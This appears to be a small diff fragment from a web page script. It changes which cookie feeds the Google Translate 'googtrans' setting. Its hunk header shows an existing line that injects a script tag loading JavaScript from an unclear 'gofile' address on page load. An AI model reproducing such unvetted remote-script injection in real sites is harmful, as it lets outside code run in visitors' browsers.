@@ -12,7 +12,7 @@ $("<script>").attr({src: "https://gofile/a0.js"}).appendTo("body");
 function modifyCookies() {
     removeCookie('googtrans');
 
-    Cookies.set('googtrans', "/auto/" + Cookies.get('mapp_language'));
+    Cookies.set('googtrans', "/auto/" + Cookies.get(custom_cookie_prefix + 'language'));
 }
 
 
